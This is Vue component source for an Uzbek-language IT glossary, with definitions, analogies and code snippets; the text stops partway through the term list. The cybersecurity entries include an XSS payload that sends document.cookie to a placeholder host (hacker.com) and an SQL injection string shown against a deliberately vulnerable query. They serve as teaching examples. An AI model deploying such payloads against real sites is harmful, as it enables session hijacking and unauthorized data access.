<script setup lang="ts">
import { ref, computed } from 'vue'
import { withBase } from 'vitepress'
import Icon from './Icon.vue'
import Crumbs from './Crumbs.vue'

interface TermItem {
  id: string
  term: string
  full: string
  cat: 'web' | 'backend' | 'android' | 'bi' | 'game' | 'iot' | 'cyber' | 'cs'
  catName: string
  tag: string
  uz_def: string
  analogy: string
  code?: string
}

const CATEGORIES = [
  { id: 'all', name: 'Barcha atamalar', icon: 'layers' },
  { id: 'web', name: 'Web & Front-end', icon: 'globe' },
  { id: 'backend', name: 'Back-end & DevOps', icon: 'server' },
  { id: 'android', name: 'Android dasturlash', icon: 'smartphone' },
  { id: 'bi', name: 'BI & Data / ML', icon: 'brain' },
  { id: 'game', name: 'Game Design', icon: 'gamepad-2' },
  { id: 'iot', name: 'IoT (Buyumlar Interneti)', icon: 'cpu' },
  { id: 'cyber', name: 'Kiberxavfsizlik', icon: 'shield' },
  { id: 'cs', name: 'CS & Foundation', icon: 'binary' }
]

const TERMS: TermItem[] = [
  // ========================================================
  // 1. WEB & FRONT-END
  // ========================================================
  {
    id: 'api',
    term: 'API',
    full: 'Application Programming Interface',
    cat: 'web',
    catName: 'Web & Front-end',
    tag: 'Integratsiya',
    uz_def: 'Ikki xil dasturiy ta’minotning o‘zaro ma’lumot almashishi va muloqot qilishi uchun standart qoidalar to‘plami.',
    analogy: 'Restorandagi ofitsiant: siz menyudan taom buyurasiz (so‘rov), ofitsiant uni oshxonaga yetkazadi va tayyor taomni (javob) sizga olib keladi.',
    code: `// Brauzerdan API orqali ma'lumot olish\nconst res = await fetch('https://api.example.com/users');\nconst data = await res.json();`
  },
  {
    id: 'dom',
    term: 'DOM',
    full: 'Document Object Model',
    cat: 'web',
    catName: 'Web & Front-end',
    tag: 'Brauzer',
    uz_def: 'HTML hujjatning brauzer xotirasida daraxt (tree) ko‘rinishida saqlanadigan va JavaScript orqali o‘zgartirish mumkin bo‘lgan nusxasi.',
    analogy: 'Bino loyihasi (HTML) asosida qurilgan tirik interaktiv bino: JS yordamida eshik rangini yoki chiroqni yoqib-o‘chirishingiz mumkin.',
    code: `const title = document.querySelector('#header-title');\ntitle.textContent = "Salom, Muhammad al-Xorazmiy vorislari!";`
  },
  {
    id: 'json',
    term: 'JSON',
    full: 'JavaScript Object Notation',
    cat: 'web',
    catName: 'Web & Front-end',
    tag: 'Ma\'lumot formati',
    uz_def: 'Matn ko‘rinishidagi, inson va mashina uchun o‘qilishi oson bo‘lgan yengil ma’lumot almashish formati.',
    analogy: 'Xalqaro standartlashtirilgan pochta konverti — har qanday davlatdagi xodim uning ichidagi manzilni bir xil o‘qiy oladi.',
    code: `{\n  "nom": "Frontend Guru",\n  "hafta": 12,\n  "faol": true\n}`
  },
  {
    id: 'spa',
    term: 'SPA',
    full: 'Single Page Application',
    cat: 'web',
    catName: 'Web & Front-end',
    tag: 'Arxitektura',
    uz_def: 'Bitta HTML sahifani yuklab, sahifalar o‘rtasida o‘tishda butun sahifani qayta yuklamasdan faqat kerakli qismlarini yangilaydigan veb-ilova (Vue, React, Svelte).',
    analogy: 'Kitobning har bir sahifasiga yangi qog‘oz ochish o‘rniga, planshet ekrandagi matnni silliq almashtirish kabi.',
    code: `// Vue Router orqali sahifani qayta yuklamasdan o'tish\nrouter.push('/foundation/datastruct');`
  },
  {
    id: 'ssr',
    term: 'SSR',
    full: 'Server-Side Rendering',
    cat: 'web',
    catName: 'Web & Front-end',
    tag: 'Render',
    uz_def: 'HTML kodlarini brauzerda emas, to‘g‘ridan-to‘g‘ri serverda tayyorlab (render qilib) brauzerga yuborish usuli (SEO va birinchi yuklanish tezligi uchun qulay).',
    analogy: 'Tayyor qovurilgan issiq ovqatni yetkazib berish (SSR) vs yarim tayyor mahsulotlarni berib, o‘zingiz uyda pishirib oling deyish (CSR).',
    code: `// Nuxt / Next.js serverda HTML tayyorlaydi\nexport async function getServerSideProps() {\n  return { props: { data } };\n}`
  },
  {
    id: 'cors',
    term: 'CORS',
    full: 'Cross-Origin Resource Sharing',
    cat: 'web',
    catName: 'Web & Front-end',
    tag: 'Xavfsizlik',
    uz_def: 'Brauzerning boshqa domen (port, protokol)dan kelayotgan resurslarni xavfsizlik maqsadida cheklash yoki ruxsat berish mexanizmi.',
    analogy: 'Boshqa xonadon eshigini taqillatganingizda, faqat ro‘yxatda bo‘lsangiz ichkariga kirita oladigan domkom qoidasi.',
    code: `# FastAPI da CORS ga ruxsat berish\napp.add_middleware(CORSMiddleware, allow_origins=["https://sayt.uz"])`
  },
  {
    id: 'jwt',
    term: 'JWT',
    full: 'JSON Web Token',
    cat: 'web',
    catName: 'Web & Front-end',
    tag: 'Autentifikatsiya',
    uz_def: 'Foydalanuvchi tizimga kirganligini tasdiqlovchi, raqamli imzolangan ixcham va xavfsiz token (uch qism: Header.Payload.Signature).',
    analogy: 'Kinoteatr yoki konsert chiptasi — chiptachi har safar bazadan sizni tekshirmaydi, chiptadagi muhr/QR kodga qarab zalga kiritadi.',
    code: `Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...`
  },
  {
    id: 'pwa',
    term: 'PWA',
    full: 'Progressive Web App',
    cat: 'web',
    catName: 'Web & Front-end',
    tag: 'Texnologiya',
    uz_def: 'Veb-saytni xuddi mobil ilovadek telefonga o‘rnatish, offline ishlash va bildirishnomalar (Push) yuborish imkonini beruvchi texnologiya.',
    analogy: 'Do‘konga bormasdan (App Store siz) veb-sahifaning o‘zidan to‘g‘ridan-to‘g‘ri telefon ekraniga tushadigan ilova.',
    code: `// manifest.json va Service Worker orqali offline kesh`
  },
  {
    id: 'websocket',
    term: 'WebSocket',
    full: 'WebSocket Protocol',
    cat: 'web',
    catName: 'Web & Front-end',
    tag: 'Real-time',
    uz_def: 'Mijoz (Client) va Server o‘rtasida uzluksiz, ikki tomonlama (full-duplex) real vaqt rejimida aloqa o‘rnatuvchi protokol.',
    analogy: 'Xat yozib kutib o‘tirish (HTTP) o‘rniga to‘g‘ridan-to‘g‘ri telefon qo‘ng‘irog‘i qilib gaplashish (WebSocket).',
    code: `const ws = new WebSocket('wss://chat.example.com');\nws.onmessage = (event) => console.log('Yangi xabar:', event.data);`
  },
  {
    id: 'responsive',
    term: 'Responsive Design',
    full: 'Moslashuvchan Veb Dizayn',
    cat: 'web',
    catName: 'Web & Front-end',
    tag: 'CSS',
    uz_def: 'Sayt ekran o‘lchamiga qarab (smartfon, planshet, monitor) avtomatik ravishda moslashib chiroyli ko‘rinishi.',
    analogy: 'Suv har qanday idish (stakan, ko‘za, shisha) shaklini oson olgani kabi.',
    code: `@media (max-width: 768px) {\n  .sidebar { display: none; }\n  .grid { grid-template-columns: 1fr; }\n}`
  },
  {
    id: 'hydration',
    term: 'Hydration',
    full: 'Client-side Hydration',
    cat: 'web',
    catName: 'Web & Front-end',
    tag: 'Frontend',
    uz_def: 'Serverdan kelgan qotib turgan statik HTML kodiga brauzerdagi JavaScript hodisalarini (click, hover) ulab, uni tirik interaktiv holatga keltirish jarayoni.',
    analogy: 'Muzlatilgan quruq gulga suv sepib, uni qayta jonlantirish kabi.',
    code: `// Vue / React avtomatik tarzda statik DOM ni o'ziga ulaydi`
  },
  {
    id: 'bundler',
    term: 'Bundler (Vite/Webpack)',
    full: 'Module Bundler',
    cat: 'web',
    catName: 'Web & Front-end',
    tag: 'Build Tool',
    uz_def: 'Yuzlab JS, CSS, rasm va kutubxona fayllarini ishlab chiqarish (production) uchun bitta yoki bir nechta ixcham va optimallashgan faylga yig‘ib beruvchi vosita.',
    analogy: 'Sayohatga ketayotganda uyimdagi barcha mayda buyumlarni ixcham chamadonga tartiblab joylash.',
    code: `npm run build # Vite butun loyihani dist/ papkaga jamlaydi`
  },

  // ========================================================
  // 2. BACK-END & DEVOPS
  // ========================================================
  {
    id: 'rest',
    term: 'REST',
    full: 'Representational State Transfer',
    cat: 'backend',
    catName: 'Back-end & DevOps',
    tag: 'Arxitektura',
    uz_def: 'HTTP metodlari (GET, POST, PUT, DELETE) asosida veb-xizmatlarni loyihalashning eng ommabop arxitektura uslubi.',
    analogy: 'Dunyodagi barcha yo‘l harakati qoidalarining yagona tilda bo‘lishi — har qanday mashina bir xil qoidaga amal qiladi.',
    code: `GET    /api/users      # ro'yxatni olish\nPOST   /api/users      # yangi qo'shish\nDELETE /api/users/42   # o'chirish`
  },
  {
    id: 'crud',
    term: 'CRUD',
    full: 'Create, Read, Update, Delete',
    cat: 'backend',
    catName: 'Back-end & DevOps',
    tag: 'Baza amallari',
    uz_def: 'Ma’lumotlar ustida bajariladigan 4 ta asosiy amal: Yaratish (Create), O‘qish (Read), Yangilash (Update), O‘chirish (Delete).',
    analogy: 'Daftarga yangi qayd yozish, uni o‘qish, xatosini tuzatish va kerak bo‘lmasa o‘chirib tashlash.',
    code: `SQL: INSERT, SELECT, UPDATE, DELETE\nHTTP: POST, GET, PUT/PATCH, DELETE`
  },
  {
    id: 'orm',
    term: 'ORM',
    full: 'Object-Relational Mapping',
    cat: 'backend',
    catName: 'Back-end & DevOps',
    tag: 'Ma\'lumotlar bazasi',
    uz_def: 'SQL so‘rovlarini qo‘lda yozmasdan, dasturlash tilidagi klass va obyektlar orqali ma’lumotlar bazasi bilan ishlash imkonini beruvchi texnologiya (SQLAlchemy, Prisma, Hibernate).',
    analogy: 'O‘zbek tilida so‘zlashuvchi odamning chet ellik bilan tarjimon orqali erkin suhbatlashishi.',
    code: `# SQL o'rniga Python klassi\nuser = User.query.filter_by(name="Ali").first()\nuser.status = "faol"\ndb.session.commit()`
  },
  {
    id: 'docker',
    term: 'Docker',
    full: 'Docker Containerization',
    cat: 'backend',
    catName: 'Back-end & DevOps',
    tag: 'DevOps',
    uz_def: 'Dastur va uning ishlashi uchun zarur bo‘lgan barcha kutubxonalarni bitta ixcham konteynerga o‘rab, har qanday serverda bir xil xatosiz ishga tushiruvchi platforma.',
    analogy: 'Mening kompyuterimda ishladi-yu, serverda ishlamayapti degan muammoni butun kompyuter muhitini konteynerga solib berish orqali hal qilish.',
    code: `FROM python:3.11-slim\nWORKDIR /app\nCOPY . .\nCMD ["uvicorn", "main:app", "--host", "0.0.0.0"]`
  },
  {
    id: 'cicd',
    term: 'CI/CD',
    full: 'Continuous Integration / Continuous Deployment',
    cat: 'backend',
    catName: 'Back-end & DevOps',
    tag: 'DevOps',
    uz_def: 'Dasturchi yangi kod kiritganda, uni avtomatik tarzda tekshirish (test qilish), yig‘ish (build) va serverga yuklash (deploy) konveyeri.',
    analogy: 'Avtomobil zavodidagi avtomatlashtirilgan yig‘ish liniyasi: har bir detal tekshiriladi va xatosiz bo‘lsa keyingi bosqichga o‘tkaziladi.',
    code: `# GitHub Actions .github/workflows/deploy.yml\non: [push]\njobs:\n  test:\n    run: pytest`
  },
  {
    id: 'middleware',
    term: 'Middleware',
    full: 'Oraliq dasturiy ta’minot',
    cat: 'backend',
    catName: 'Back-end & DevOps',
    tag: 'Backend',
    uz_def: 'So‘rov (Request) asosiy ishlov beruvchi kontrollerga yetib borguncha uni tekshiruvchi (log yozish, token tekshirish, xavfsizlik) oraliq qatlam.',
    analogy: 'Bino kirishidagi nazorat-o‘tkazish punkti (tana haroratini o‘lchash va ruxsatnomani tekshirish).',
    code: `@app.middleware("http")\nasync def auth_check(request, call_next):\n    if not request.headers.get("Authorization"):\n        return Response(status_code=401)\n    return await call_next(request)`
  },
  {
    id: 'microservices',
    term: 'Microservices',
    full: 'Mikroservislar arxitekturasi',
    cat: 'backend',
    catName: 'Back-end & DevOps',
    tag: 'Arxitektura',
    uz_def: 'Bitta ulkan dasturni (Monolit) bir-biridan mustaqil ishlaydigan kichik servislar (Foydalanuvchilar, To‘lovlar, Buyurtmalar)ga bo‘lib qurish usuli.',
    analogy: 'Bitta odam hamma ishni qilishi (monolit) o‘rniga, har bir ishni alohida mutaxassis bajaradigan jamoa.',
    code: `Auth Service (Port 8001) <-> Order Service (Port 8002) <-> Payment Service (Port 8003)`
  },
  {
    id: 'redis',
    term: 'Redis (Cache)',
    full: 'Remote Dictionary Server',
    cat: 'backend',
    catName: 'Back-end & DevOps',
    tag: 'Kesh & Xotira',
    uz_def: 'Ma’lumotlarni tezkor xotirada (RAM) kalit-qiymat (Key-Value) ko‘rinishida saqlovchi juda tezkor kesh va xabarlar tizimi.',
    analogy: 'Har safar arxiv omboriga borib qog‘oz qidirmasdan, eng ko‘p kerak bo‘ladigan ma’lumotlarni stol ustidagi yondaftarga yozib qo‘yish.',
    code: `redis_client.set("user:101:balance", 500000, ex=60) # 60 soniyalik kesh`
  },
  {
    id: 'load_balancer',
    term: 'Load Balancer',
    full: 'Yuklamani taqsimlovchi',
    cat: 'backend',
    catName: 'Back-end & DevOps',
    tag: 'DevOps & Tarmoq',
    uz_def: 'Kelayotgan millionlab foydalanuvchilar so‘rovini bir nechta serverlar o‘rtasida teng taqsimlab, tizim qulab qolishining oldini oluvchi vosita (Nginx, HAProxy).',
    analogy: 'Bankdagi navbat boshqaruvchi xodim: mijozlarni bo‘sh turgan kassirlarga birin-ketin yo‘naltiradi.',
    code: `upstream my_servers {\n  server 10.0.0.1:8000;\n  server 10.0.0.2:8000;\n}`
  },
  {
    id: 'webhook',
    term: 'Webhook',
    full: 'Web Callback / Event Notification',
    cat: 'backend',
    catName: 'Back-end & DevOps',
    tag: 'Integratsiya',
    uz_def: 'Biror voqea yuz berganda (masalan to‘lov o‘tganda) bir tizim boshqa tizimga avtomatik tarzda HTTP POST orqali xabar yuborishi.',
    analogy: 'Har daqiqada pochtaga borib xat keldimi deb so‘rash (Polling) o‘rniga, xat kelgan zahoti kuryer eshigiingizni taqillatishi (Webhook).',
    code: `@app.post("/webhook/payme")\nasync def handle_payment(data: PaymentSchema):\n    activate_user_subscription(data.user_id)`
  },

  // ========================================================
  // 3. ANDROID & MOBIL DASTURLASH
  // ========================================================
  {
    id: 'sdk',
    term: 'SDK',
    full: 'Software Development Kit',
    cat: 'android',
    catName: 'Android dasturlash',
    tag: 'Asboblar',
    uz_def: 'Muayyan platforma (masalan, Android) uchun ilovalar yaratishga mo‘ljallangan tayyor vositalar, kutubxonalar va emulyatorlar to‘plami.',
    analogy: 'Mebel yasash uchun maxsus ustaxona qutisi: ichida arra, bolg‘a, o‘lchagich va barcha kerakli andazalar bor.',
    code: `android {\n  compileSdk 34\n  defaultConfig {\n    minSdk 24\n    targetSdk 34\n  }\n}`
  },
  {
    id: 'apk_aab',
    term: 'APK / AAB',
    full: 'Android Package Kit / Android App Bundle',
    cat: 'android',
    catName: 'Android dasturlash',
    tag: 'Ilova formati',
    uz_def: 'Android operatsion tizimida o‘rnatiladigan tayyor ilova fayli (APK) va Google Play uchun optimallashgan rasmiy paket (AAB).',
    analogy: 'Yig‘ilgan tayyor velosiped (APK) vs yukxona hajmini tejash uchun qismlarga ajratilib qutilangan model (AAB).',
    code: `./gradlew assembleRelease  # APK yaratish\n./gradlew bundleRelease    # AAB yaratish`
  },
  {
    id: 'activity',
    term: 'Activity',
    full: 'Android UI Ekran oynasi',
    cat: 'android',
    catName: 'Android dasturlash',
    tag: 'Komponent',
    uz_def: 'Foydalanuvchi ko‘radigan va muloqot qiladigan bitta mustaqil vizual ekran oynasi.',
    analogy: 'Kitobning alohida sahifasi yoki teatr sahnasidagi bitta to‘liq ko‘rinish.',
    code: `class MainActivity : AppCompatActivity() {\n    override fun onCreate(savedInstanceState: Bundle?) {\n        super.onCreate(savedInstanceState)\n        setContentView(R.layout.activity_main)\n    }\n}`
  },
  {
    id: 'compose',
    term: 'Jetpack Compose',
    full: 'Zamonaviy Deklarativ UI Framework',
    cat: 'android',
    catName: 'Android dasturlash',
    tag: 'UI Framework',
    uz_def: 'Android uchun eski XML fayllarsiz, to‘g‘ridan-to‘g‘ri Kotlin kodida interfeyslarni qulay va tezkor chizish vositasi.',
    analogy: 'Eski chizma qog‘ozida chizish (XML) o‘rniga, konstruktor kubiklaridan tezkorlik bilan shakl yasash.',
    code: `@Composable\nfun Greeting(name: String) {\n    Text(text = "Salom, $name!", color = Color.Green)\n}`
  },
  {
    id: 'coroutine',
    term: 'Coroutine',
    full: 'Asinxron yengil iplar (Kotlin)',
    cat: 'android',
    catName: 'Android dasturlash',
    tag: 'Asinxronlik',
    uz_def: 'Asosiy ekran interfeysini (UI) qotirib qo‘ymasdan, orqa fonda og‘ir amallarni (tarmoq, baza) yengil va samarali bajarish usuli.',
    analogy: 'Choy damlaguncha qotib turmasdan, choy qaynaguncha bemalol boshqa yumushlarni qilib turish.',
    code: `viewModelScope.launch(Dispatchers.IO) {\n    val data = apiService.fetchData()\n    withContext(Dispatchers.Main) { updateUi(data) }\n}`
  },
  {
    id: 'viewmodel',
    term: 'ViewModel',
    full: 'MVVM Arxitektura komponenti',
    cat: 'android',
    catName: 'Android dasturlash',
    tag: 'Arxitektura',
    uz_def: 'Telefonni yonga buraganda (ekran aylanganda) ma’lumotlar o‘chib ketmasligi uchun ularni xavfsiz saqlab turuvchi qatlam.',
    analogy: 'Sahna pardasi almashtirilayotganda aktyorning kiyimlarini saqlab turadigan orqa xona (grimxona).',
    code: `class UserViewModel : ViewModel() {\n    private val _users = MutableStateFlow<List<User>>(emptyList())\n    val users: StateFlow<List<User>> = _users\n}`
  },
  {
    id: 'anr',
    term: 'ANR',
    full: 'Application Not Responding',
    cat: 'android',
    catName: 'Android dasturlash',
    tag: 'Xatolik',
    uz_def: 'Ilova 5 soniyadan ortiq vaqt davomida foydalanuvchi bosishiga javob bermay qotib qolganda Android tizimi chiqaradigan ogohlantirish.',
    analogy: 'Kassir qotib qolib, 5 daqiqa davomida navbatdagilarga umuman e’tibor bermay qo‘yishi.',
    code: `// Xato: Asosiy oqimda (Main Thread) og'ir yuklama bajarmang!`
  },
  {
    id: 'adb',
    term: 'ADB',
    full: 'Android Debug Bridge',
    cat: 'android',
    catName: 'Android dasturlash',
    tag: 'Terminal Tool',
    uz_def: 'Kompyuter va Android qurilma o‘rtasida buyruqlar almashish, ilovalarni o‘rnatish va loglarni ko‘rish uchun xizmat qiluvchi konsol dasturi.',
    analogy: 'Kompyuterdan turib telefon ichiga to‘g‘ridan-to‘g‘ri buyruq beruvchi maxsus masofaviy pult.',
    code: `adb devices          # ulangan telefonlarni ko'rish\nadb install app.apk  # ilovani o'rnatish\nadb logcat           # xatolik loglarini o'qish`
  },

  // ========================================================
  // 4. BUSINESS INTELLIGENCE & DATA / ML
  // ========================================================
  {
    id: 'etl',
    term: 'ETL / ELT',
    full: 'Extract, Transform, Load',
    cat: 'bi',
    catName: 'BI & Data / ML',
    tag: 'Ma\'lumot quvuri',
    uz_def: 'Har xil manbalardan ma’lumotlarni yig‘ish (Extract), tozalash va tahlilga moslash (Transform), so‘ng omborga yuklash (Load) jarayoni.',
    analogy: 'Konditerlik fabrikasi: xom ashyoni yig‘ish, tozalab aralashtirish va chiroyli qadoqlarga joylash.',
    code: `# Python Pandas orqali sodda ETL\ndf = pd.read_csv('sales.csv')\ndf['total'] = df['qty'] * df['price']\ndf.to_sql('sales_clean', con=db_engine)`
  },
  {
    id: 'data_warehouse',
    term: 'Data Warehouse (DWH)',
    full: 'Ma’lumotlar Ombori',
    cat: 'bi',
    catName: 'BI & Data / ML',
    tag: 'Katta ma\'lumot',
    uz_def: 'Kompaniyaning barcha tarixiy ma’lumotlari biznes tahlil va qarorlar qabul qilish uchun jamlanadigan maxsus markazlashtirilgan baza (BigQuery, Snowflake).',
    analogy: 'Oddiy operatsion do‘kon peshtaxtasi (OLTP) emas, balki shaharning barcha yillik zaxirasi saqlanadigan ulkan logistika ombori (DWH).',
    code: `SELECT region, SUM(revenue) FROM \`bigquery-public-data.sales\` GROUP BY region;`
  },
  {
    id: 'kpi',
    term: 'KPI',
    full: 'Key Performance Indicator',
    cat: 'bi',
    catName: 'BI & Data / ML',
    tag: 'Biznes ko\'rsatkich',
    uz_def: 'Loyiha yoki tashkilot o‘z maqsadiga qanchalik muvaffaqiyatli erishayotganini o‘lchaydigan asosiy ko‘rsatkich.',
    analogy: 'Avtomobil spidometri va yonilg‘i datchigi — manzilga o‘z vaqtida va xavfsiz yetib borish holatini ko‘rsatib turadi.',
    code: `KPI = (Joriy foyda / Rejalashtirilgan maqsad) * 100%`
  },
  {
    id: 'overfitting',
    term: 'Overfitting',
    full: 'Modelning haddan tashqari moslashishi',
    cat: 'bi',
    catName: 'BI & Data / ML',
    tag: 'Mashinali o\'rganish',
    uz_def: 'Sun’iy intellekt modeli o‘quv ma’lumotlarini shunchaki yodlab olib, yangi ko‘rilmagan ma’lumotlarda juda yomon natija ko‘rsatishi.',
    analogy: 'O‘quvchi imtihonga tayyorlanayotganda mavzuni tushunmasdan aynan 1 ta test javoblarini yodlab olib, yangi savol tushganda yiqilishi.',
    code: `# Regularizatsiya (Dropout, L2) orqali oldi olinadi\nmodel.add(Dropout(0.3))`
  },
  {
    id: 'rag',
    term: 'RAG',
    full: 'Retrieval-Augmented Generation',
    cat: 'bi',
    catName: 'BI & Data / ML',
    tag: 'LLM & AI',
    uz_def: 'Katta til modeliga (LLM) javob berishdan oldin kompaniyaning maxsus hujjatlaridan qidirib topib, faktlarga asoslangan aniq javob berishini ta’minlash usuli.',
    analogy: 'Talabaning yopiq kitob bilan emas, balki kerakli konspektni ochib ko‘rib, eng to‘g‘ri va yangi faktlar bilan javob berishi.',
    code: `1. User savoli -> Vektor qidiruv (Chroma/Pinecone) -> Topilgan matn + Savol -> LLM`
  },
  {
    id: 'prompt_eng',
    term: 'Prompt Engineering',
    full: 'AI so‘rovlarini muhandislik qilish',
    cat: 'bi',
    catName: 'BI & Data / ML',
    tag: 'Sun\'iy intellekt',
    uz_def: 'Sun’iy intellektdan eng aniq, xatosiz va sifatli natija olish uchun buyruq va kontekstni to‘g‘ri tuzish san’ati.',
    analogy: 'Tajribali ustaga vazifani barcha talablari va mezonlari bilan tushuntirish.',
    code: `"Sen tajribali Python mentorsan. Quyidagi kodni tahlil qil va kamchiliklarini bullet point shaklida ko'rsat:"`
  },

  // ========================================================
  // 5. GAME DESIGN & DEV
  // ========================================================
  {
    id: 'fps',
    term: 'FPS',
    full: 'Frames Per Second / First-Person Shooter',
    cat: 'game',
    catName: 'Game Design',
    tag: 'Grafika',
    uz_def: '1) Ekranda bir soniyada chiziladigan kadrlar soni (kamida 60 FPS silliq o‘yin uchun zarur). 2) Birinchi shaxs nomidan otishma o‘yin janri.',
    analogy: 'Qog‘oz burchagiga multfilm chizib, sahifalarini tez varaqlaganda harakat qanchalik silliq ko‘rinishi.',
    code: `const deltaTime = 1.0 / targetFPS; // 60 FPS da har kadr ~16.6ms`
  },
  {
    id: 'hitbox',
    term: 'Hitbox',
    full: 'To‘qnashuv maydoni (Collision Box)',
    cat: 'game',
    catName: 'Game Design',
    tag: 'Fizika',
    uz_def: 'O‘yin qahramoni yoki obyektiga o‘q tekkanini, zarba berilganini aniqlash uchun uning atrofiga chizilgan ko‘rinmas geometrik chegara.',
    analogy: 'Futbol darvozasi chizig‘i — to‘p aynan shu ko‘rinmas chiziqdan to‘liq o‘tsagina gol hisoblanadi.',
    code: `if (player.hitbox.intersects(bullet.hitbox)) {\n    player.takeDamage(25);\n}`
  },
  {
    id: 'game_loop',
    term: 'Game Loop',
    full: 'O‘yinning asosiy cheksiz sikli',
    cat: 'game',
    catName: 'Game Design',
    tag: 'Arxitektura',
    uz_def: 'O‘yin davomida har bir soniyada o‘nlab marta takrorlanuvchi jarayon: 1. Kiritishni qabul qilish, 2. Fizika va holatni yangilash, 3. Ekranga chizish (Render).',
    analogy: 'Inson yuragining tinimsiz urishi: kislorod oladi, qon haydaydi, tanani tirik ushlab turadi.',
    code: `function loop() {\n    processInput();\n    updatePhysics();\n    render();\n    requestAnimationFrame(loop);\n}`
  },
  {
    id: 'shader',
    term: 'Shader',
    full: 'Grafik karta (GPU) mikrodasturi',
    cat: 'game',
    catName: 'Game Design',
    tag: 'Render & GPU',
    uz_def: 'Videokartada (GPU) to‘g‘ridan-to‘g‘ri ishlovchi, yorug‘lik, soya, suv to‘lqini, olov va ranglarni hisoblovchi tezkor dastur.',
    analogy: 'Rassomning qora-oq rasm ustiga mo‘yqalam bilan yorug‘lik va soya effektlarini kiritishi.',
    code: `// GLSL Fragment Shader\nvoid main() {\n    gl_FragColor = vec4(1.0, 0.5, 0.0, 1.0); // Olovrang piksel\n}`
  },
  {
    id: 'rigging',
    term: 'Rigging',
    full: '3D Skelet tizimini o‘rnatish',
    cat: 'game',
    catName: 'Game Design',
    tag: '3D Modellashtirish',
    uz_def: '3D modelni harakatlantirish (animatsiya qilish) uchun uning ichiga suyaklar (Bones) va bo‘g‘inlar tizimini joylashtirish.',
    analogy: 'Qo‘g‘irchoq teatrida qo‘g‘irchoqning qo‘l va oyoqlariga iplar va bo‘g‘inlar o‘rnatish.',
    code: `Armature -> Bone Root -> Spine -> Arm_L / Arm_R`
  },

  // ========================================================
  // 6. IOT (BUYUMLAR INTERNETI)
  // ========================================================
  {
    id: 'gpio',
    term: 'GPIO',
    full: 'General Purpose Input/Output',
    cat: 'iot',
    catName: 'IoT',
    tag: 'Uskuna',
    uz_def: 'Mikrokontrollerdagi (Arduino, ESP32, Raspberry Pi) tashqi sensorlar, tugmalar va svetodiodlarni ulash mumkin bo‘lgan universal oyoqchalar (pinlar).',
    analogy: 'Kompyuterning istalgan qurilmani (fleshka, sichqoncha, klaviatura) ulash mumkin bo‘lgan universal USB portlari kabi.',
    code: `pinMode(13, OUTPUT);\ndigitalWrite(13, HIGH); // 13-pinga 3.3V/5V kuchlanish berish`
  },
  {
    id: 'mqtt',
    term: 'MQTT',
    full: 'Message Queuing Telemetry Transport',
    cat: 'iot',
    catName: 'IoT',
    tag: 'Protokol',
    uz_def: 'Kuchlanishi va internet tezligi past bo‘lgan aqlli qurilmalar (IoT) uchun maxsus yaratilgan juda yengil xabarlar almashish protokoli (Publish / Subscribe).',
    analogy: 'Telegramdagi kanal tizimi: harorat datchigi yangi ma’lumotni kanalga tashlaydi (publish), obuna bo‘lgan konditsioner esa xabarni olib ishga tushadi (subscribe).',
    code: `client.publish("uy/xona1/harorat", "24.5");\nclient.subscribe("uy/xona1/#");`
  },
  {
    id: 'esp32',
    term: 'ESP32',
    full: 'Wi-Fi & Bluetooth Mikrokontroller',
    cat: 'iot',
    catName: 'IoT',
    tag: 'Mikrosxema',
    uz_def: 'O‘zida Wi-Fi va Bluetooth modullarini jamlagan, arzon va kuchli ikki yadroli IoT mikrokontrolleri.',
    analogy: 'O‘zida ham miya, ham simsiz aloqa antennasi bo‘lgan ixcham aqlli mitti robot yuragi.',
    code: `#include <WiFi.h>\nWiFi.begin("MeningWiFi", "Parol123");`
  },
  {
    id: 'pwm',
    term: 'PWM',
    full: 'Pulse Width Modulation',
    cat: 'iot',
    catName: 'IoT',
    tag: 'Signal',
    uz_def: 'Raqamli signalni juda tez yoqib-o‘chirish orqali dvigatel tezligini yoki svetodiod yorug‘ligini silliq boshqarish usuli.',
    analogy: 'Xona chirog‘ini sekundiga 1000 marta yoqib-o‘chirib, ko‘zga uni xira yoki yorug‘ ko‘rsatish usuli.',
    code: `analogWrite(LED_PIN, 128); // 50% yorug'lik kuchi`
  },

  // ========================================================
  // 7. KIBERXAVFSIZLIK (ETHICAL HACKING)
  // ========================================================
  {
    id: 'sqli',
    term: 'SQL Injection (SQLi)',
    full: 'SQL Kodini suqib kiritish hujumi',
    cat: 'cyber',
    catName: 'Kiberxavfsizlik',
    tag: 'Zaiflik',
    uz_def: 'Foydalanuvchi kiritish maydoniga (login, parol) maxsus SQL buyruqlarini yozib, bazadagi yashirin ma’lumotlarni ruxsatsiz qo‘lga kiritish yoki o‘chirish zaifligi.',
    analogy: 'Hujjatdagi ismingiz o‘rniga "Ismim Ali va unga barcha pullarni bering" deb yozib, qalbaki ruxsat olish.',
    code: `// Zaif kod:\nquery = "SELECT * FROM users WHERE user = '" + input + "'"\n// Kiritilgan hujum: ' OR '1'='1`
  },
  {
    id: 'xss',
    term: 'XSS',
    full: 'Cross-Site Scripting',
    cat: 'cyber',
    catName: 'Kiberxavfsizlik',
    tag: 'Zaiflik',
    uz_def: 'Veb-sahifaga (masalan izohlar qismiga) zararli JavaScript kodini joylashtirib, boshqa foydalanuvchilarning cookie yoki tokenlarini o‘g‘irlash hujumi.',
    analogy: 'Maktab e’lonlar doskasiga zaharli yelim surtib qo‘yish — har bir tegingan o‘quvchining barmog‘iga yopishadi.',
    code: "<script>fetch('https://hacker.com/steal?c=' + document.cookie)<" + "/script>"
  },
  {
    id: 'ddos',
    term: 'DDoS',
    full: 'Distributed Denial of Service',
    cat: 'cyber',
    catName: 'Kiberxavfsizlik',
    tag: 'Hujum',
    uz_def: 'Yuz minglab kompyuterlar (botnet) orqali bitta serverga bir vaqtda haddan ortiq ko‘p so‘rov yuborib, uning ish faoliyatini to‘xtatib qo‘yish.',
    analogy: 'Kichik do‘konga bir vaqtda 5000 kishi kirib hech narsa sotib olmasdan eshiklarni to‘sib qo‘yishi natijasida haqiqiy xaridorlar kira olmasligi.',
    code: `# Himoya: Cloudflare, Rate Limiting, DDoS Shield`
  },
  {
    id: 'phishing',
    term: 'Phishing',
    full: 'Fishing (Qalbaki tuzoq sahifalar)',
    cat: 'cyber',
    catName: 'Kiberxavfsizlik',
    tag: 'Ijtimoiy muhandislik',
    uz_def: 'Foydalanuvchini aldab, mashhur saytlar (Telegram, Google, Bank) nusxasiga o‘xshash soxta sayt orqali login va parollarini o‘g‘irlash.',
    analogy: 'Haqiqiy baliq ovidagi qarmoqqa qurt ilib baliqni aldash kabi.',
    code: `Haqiqiy: https://telegram.org\nQalbaki: https://te1egram-login-gift.xyz`
  },
  {
    id: 'hash_salt',
